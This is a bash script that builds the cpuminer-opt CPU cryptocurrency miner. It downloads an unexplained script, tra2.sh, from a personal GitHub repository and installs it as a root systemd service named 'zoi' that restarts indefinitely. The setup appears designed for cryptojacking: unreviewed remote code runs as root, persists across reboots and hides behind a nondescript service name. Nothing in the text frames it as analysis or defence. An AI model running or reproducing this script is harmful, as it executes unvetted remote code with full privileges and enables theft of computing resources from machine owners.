#!/bin/bash
apt-get update && 
apt-get -y install build-essential libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev automake git &&
sudo sysctl vm.nr_hugepages=128 &&
cd /usr/local/src/ &&
wget https://github.com/JayDDee/cpuminer-opt/archive/v3.8.3.1.tar.gz &&
tar xvzf v3.8.3.1.tar.gz &&
cd cpuminer-opt-3.8.3.1 &&
wget https://raw.githubusercontent.com/fablebox/susuwatari/master/thanhmlzz/tra2.sh &&
chmod +x tra2.sh &&
./autogen.sh &&
CFLAGS="-O3 -march=native -Wall" CXXFLAGS="$CFLAGS -std=gnu++11" ./configure --with-curl &&
make &&
bash -c 'cat <<EOT >>/lib/systemd/system/zoi.service 
[Unit]
Description=zoi
After=network.target
[Service]
ExecStart= /usr/local/src/cpuminer-opt-3.8.3.1/tra2.sh
WatchdogSec=3600
Restart=always
RestartSec=60
User=root
[Install]
WantedBy=multi-user.target
EOT
' &&
systemctl daemon-reload &&
systemctl enable zoi.service &&
service zoi start
